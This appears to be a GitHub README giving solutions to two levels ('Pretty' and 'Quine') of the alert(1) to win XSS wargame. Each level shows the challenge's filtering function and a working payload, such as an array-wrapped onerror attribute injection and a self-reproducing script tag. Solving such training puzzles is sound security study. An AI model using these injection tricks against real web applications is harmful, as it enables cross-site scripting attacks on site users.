# alert-1-to-win
solutions for xss wargame alert(1) to win https://alf.nu/alert1

## Pretty (32)
I know many people already solved this level, but since I couldn't find payload on the internet so I decided to upload it.
```
function escape(input) {
  const quote = s => s.replace(/[<>"]/gu, x => '&#'+x.codePointAt(0)+';');
  const safe = {src:1, alt:1};
  const o = JSON.parse(input);
  let s = '<img';
  
  for (const k in o) {
    if(!safe[k]) continue;
    s += ' ' + k + '=';
    if ([...o[k]].every(x => x >= 'a' && x <= 'z')) {
       s += o[k];
    } else {
       s += '"' + quote(o[k]) + '"';
    }
  }
  return s+'>hello</span>';
}
```
input:
```
{"src": ["a onerror=alert(1)"]}
```
output:
```
<img src=a onerror=alert(1)>hello</span>
```

this also works. (found from access token provided by https://github.com/1bitrs/alert-1-to-win)
```
{"src":"","alt":"a onerror=alert(1) "}
```

## Quine (63)
```
/ submitted by Somebody
function escape(s) {
    // We've got a quine level in all of the other
    // games, so why not have one here?
    var win = alert;
    window.alert = function(t) {
        if (t === s)
            win(1);
        else
            console.log("Alert: " + t + "\n(That's not a quine)");
    }
    return s;
}
```

input:
```
<script>f=_=>alert(`<script>f=${f};f()<\/script>`);f()</script>
```
output is equal to the input value.
